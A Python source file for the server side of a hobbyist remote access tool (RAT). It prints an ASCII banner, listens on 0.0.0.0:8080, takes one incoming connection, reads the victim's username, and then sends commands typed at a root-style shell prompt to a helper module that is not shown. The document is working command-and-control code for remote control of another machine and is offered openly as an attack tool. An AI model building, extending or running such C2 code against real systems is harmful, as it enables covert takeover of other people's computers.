"""
server.py
version = 0.001
Remote Access Tool
Made by Lukas Alstrup
github.com/LukasAlstrup/rat

"""
import os
import socket
import base64
import random
import datetime
import time
from functions import *

#Welcome
print("[+] Welcome to Lukas Alstrup's Remote Access tool")
print("""  _     _    _ _  __           _____            _       _____ _______ _____  _    _ _____  
 | |   | |  | | |/ /    /\    / ____|     /\   | |     / ____|__   __|  __ \| |  | |  __ \ 
 | |   | |  | | ' /    /  \  | (___      /  \  | |    | (___    | |  | |__) | |  | | |__) |
 | |   | |  | |  <    / /\ \  \___ \    / /\ \ | |     \___ \   | |  |  _  /| |  | |  ___/ 
 | |___| |__| | . \  / ____ \ ____) |  / ____ \| |____ ____) |  | |  | | \ \| |__| | |     
 |______\____/|_|\_\/_/    \_\_____/  /_/    \_\______|_____/   |_|  |_|  \_\\____/|_|     
                                                                                           
                                                                                           """)

#Listen
s = socket.socket()
#host = socket.gethostname()
host = "0.0.0.0"
port = 8080

s.bind((host, port))
print("[+] The listener has been started...")
print("[+] LHOST = ", host)
print("[+] LPORT = ", port)
print("[+] Waiting for incomming connections")
s.listen(1) #Change 1 for multiple connections
conn, addr = s.accept()

print("[+] ", addr, "has connected to the server successfully")
print("")

username = conn.recv(10000000)

def main():
    name = str(str(username.decode()) + "@" + str(addr[0])+ " :~# ")


    def error(error_msg):
        print("[-] There was an unexpected error. Here is the error message: ", error_msg)
        
        
    while True:
        
        command = str(input(name))
        
        #try:
        check_command(conn,command)

        #except Exception as error_msg:
        #    error(error_msg)
            

            
main()